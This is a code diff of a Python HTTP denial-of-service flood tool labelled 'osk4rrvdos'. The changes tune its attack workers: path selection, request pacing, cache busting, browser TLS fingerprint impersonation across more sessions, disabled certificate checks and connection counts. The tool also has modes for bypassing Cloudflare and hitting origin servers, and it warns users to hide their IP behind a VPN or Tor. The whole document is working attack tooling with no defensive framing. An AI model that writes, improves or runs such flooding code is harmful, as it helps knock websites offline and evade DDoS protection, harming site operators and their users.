@@ -464,11 +464,11 @@ def pick_path():
     if bypass_active and known_good_paths and random.random() < 0.7:
         return random.choice(known_good_paths)
     r = random.random()
-    if r < 0.50:
+    if r < 0.65:
         return "/"
-    elif r < 0.70:
+    elif r < 0.80:
         return random.choice(PRIMARY_PATHS)
-    elif r < 0.85:
+    elif r < 0.90:
         return random.choice(SECONDARY_PATHS)
     return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))
 
@@ -1230,7 +1230,7 @@ async def attack_worker(session, url_obj, host, tid):
     netloc = url_obj.netloc
     profile = worker_profile()
 
-    await asyncio.sleep(random.uniform(0, 0.5))
+    await asyncio.sleep(random.uniform(0, 0.1))
 
     while running:
         method = pick_method()
@@ -1238,7 +1238,7 @@ async def attack_worker(session, url_obj, host, tid):
             path = pick_cf_path()
         else:
             path = pick_path()
-        if boost_mode or multi_method or cf_kill:
+        if (boost_mode or multi_method or cf_kill) and not use_curl_cffi:
             path = cache_bust(path)
         headers = build_headers(host, profile, method, port=url_obj.port)
 
@@ -1294,7 +1294,7 @@ async def attack_worker(session, url_obj, host, tid):
             start_ts = time.time()
 
             if use_curl_cffi:
-                req_kwargs = {"headers": headers, "timeout": 5, "allow_redirects": True}
+                req_kwargs = {"headers": headers, "timeout": 3, "allow_redirects": False, "verify": False}
                 if method in ("POST", "PUT", "PATCH") and post_data:
                     req_kwargs["data"] = post_data
                 req_func = getattr(session, method.lower())
@@ -1463,8 +1463,9 @@ async def http_attack(url, host, conns):
     if use_curl_cffi:
         impersonate_choices = ["chrome", "chrome110", "chrome116", "chrome120", "chrome124",
                                "edge99", "edge101", "safari15_3", "safari15_5", "safari17_0"]
-        safe_print(f"< / > Using curl_cffi (browser TLS impersonation) — {len(impersonate_choices)} fingerprints")
-        for s_idx in range(session_count):
+        curl_sessions = max(session_count, 8)
+        safe_print(f"< / > Using curl_cffi (browser TLS impersonation) — {len(impersonate_choices)} fingerprints, {curl_sessions} sessions")
+        for s_idx in range(curl_sessions):
             imp = random.choice(impersonate_choices)
             sess = CurlAsyncSession(impersonate=imp)
             sessions.append(sess)
@@ -1678,12 +1679,12 @@ def main():
     elif boost_mode:
         if interactive:
             try:
-                sc_input = input("[osk4rrvdos] Session count (default=3): ").strip()
-                session_count = int(sc_input) if sc_input else 3
+                sc_input = input("[osk4rrvdos] Session count (default=5): ").strip()
+                session_count = int(sc_input) if sc_input else 5
             except ValueError:
-                session_count = 3
+                session_count = 5
         else:
-            session_count = 3
+            session_count = 5
 
     safe_print("\n [!] Direct mode — your real IP WILL be visible!")
     safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
@@ -1760,11 +1761,11 @@ def main():
         conns = cli.conns
     elif use_curl_cffi:
         if boost_mode:
-            conns = 50
-        elif bypass_active or cf_kill:
-            conns = 30
-        else:
             conns = 20
+        elif bypass_active or cf_kill:
+            conns = 15
+        else:
+            conns = 10
     elif cf_kill and direct_origin and origin_ips:
         conns = 120 // session_count
     elif boost_mode:
@@ -1841,11 +1842,11 @@ def main():
     if not (cli and cli.conns and cli.conns > 0):
         if use_curl_cffi:
             if boost_mode:
-                conns = 50
-            elif bypass_active or cf_kill:
-                conns = 30
-            else:
                 conns = 20
+            elif bypass_active or cf_kill:
+                conns = 15
+            else:
+                conns = 10
         else:
             if cf_kill and direct_origin and origin_ips:
                 conns = 120 // session_count
